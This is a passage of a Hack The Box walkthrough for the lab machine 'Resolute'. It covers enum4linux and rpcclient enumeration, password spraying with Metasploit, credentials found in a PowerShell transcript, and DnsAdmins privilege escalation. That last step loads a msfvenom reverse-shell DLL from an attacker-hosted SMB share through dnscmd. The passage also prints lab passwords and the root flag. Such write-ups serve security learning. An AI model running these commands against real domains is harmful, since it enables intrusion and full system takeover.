Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group 'Domain Users' (RID: 513) has member: MEGABANK\per
Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.

 ======================================================================= 
|    Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.10.169    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat May 30 02:48:44 2020

 
 ```
 
**nice results!**
**we got the password of marko user**

```ruby

index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
```

**let's get it with another way.**

# []() SMB & RPC Enumeration:

so as we know this is a windows machine and the important thing to do is smb enumeration so let's go.

1. **Anonymous login with smbclient**.

```ruby
smbclient -L \\\\10.10.10.169
Enter WORKGROUP\xdev05's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```
nothing yet.

2. **RPC enumeration with rpcclient**

after some enumeration with rpc client i got the password for marko user but didn't work beacause this password for another user so let me show you.

```ruby
rpcclient -U "" 10.10.10.169
Enter WORKGROUP\'s password: 
rpcclient $> querydominfo
Domain:		MEGABANK
Server:		
Comment:	
Total Users:	79
Total Groups:	0
Total Aliases:	0
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
rpcclient $> 
```
**now we logged in rpcclient, and we have the users from the enum4linux scan , let's grep the password for marko now.**

```ruby
rpcclient $> queryuser marko
	User Name   :	marko
	Full Name   :	Marko Novak
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Account created. Password set to Welcome123!
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Fri, 27 Sep 2019 09:17:15 EDT
	Password can change Time :	Sat, 28 Sep 2019 09:17:15 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x457
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...


```
now i will use this password to login smb.

```ruby
smbclient -L \\\\10.10.10.169  -U marko
Enter WORKGROUP\marko's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```
good so now we need to bruteforce the user for this password.

**in this point i used metasploit to do the bruteforce with the users list**
**i made the users list from our eumeration**

###[]()SMB Bruteforce with msfconsole:

--> i made a list for users  

![](https://i.ibb.co/yNHFFk5/users.png)

**now i used this module in metasploit --> auxiliary/scanner/smb/smb_login**
* use auxiliary/scanner/smb/smb_login
* set ptions and run.

![](https://i.ibb.co/WDStWTS/success.png)

good, now we got the user for the password.

**i'll use evil_winrm to login**

![](https://i.ibb.co/ygWhD5F/winrm.png)

**pingo! here we got the user flag**

# []()Privilege Escalation:

**after some enumeration i found intersted file wich contain a credentials of Ryan.** --> **The credentials is in C:\PSTranscripts\20191203> by searching for hidden files using ls -hidden**

and the Credentials is **ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!**


**Ryan:Serv3r4Admin4cc123!**

and from **whoami /all and whoami /groups** i found that Ryan belongs to **MEGABASNK\DnsAdmins** group so we can create an executable file like exe or dll to get a reverse shell as system admin and in this point we will use DLL injection.

![](https://i.ibb.co/YPmHdST/dnsadmins.png)

**Lets's Start**

### []()Create A malicious Dll File using Msfvenom:

```ruby

xdev05@XDev05:~/Documents/HTB/Resolute$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platform=windows -f dll > dns.dll
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes

```

### []() Running SMB Share:

```ruby

xdev05@XDev05:/usr/share/doc/python3-impacket/examples$ sudo python3 smbserver.py SHARE /home/xdev05/
[sudo] password for xdev05: 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### []()Running Our DLL file using DNSCMD:

**now i will run my dll file to get a reverse shell**

1. dnscmd.exe resolute /config /serverlevelplugindll \\10.10.16.44\SHARE\plugins.dll

2. sc.exe stop dns

3. sc.exe start dns

ping!

![](https://i.ibb.co/g7b6DL6/root.png)

and here the root flag 

```ruby

C:\Users\Administrator\Desktop>type root.txt
type root.txt
e1d94876a506850d0c20edb5405e619c
C:\Users\Administrator\Desktop>

```
# []()Refrences:

1. [https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/]()
2. [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2]()

Thanks For Reading.


 <script src="https://www.hackthebox.eu/badge/103789"></script>










 
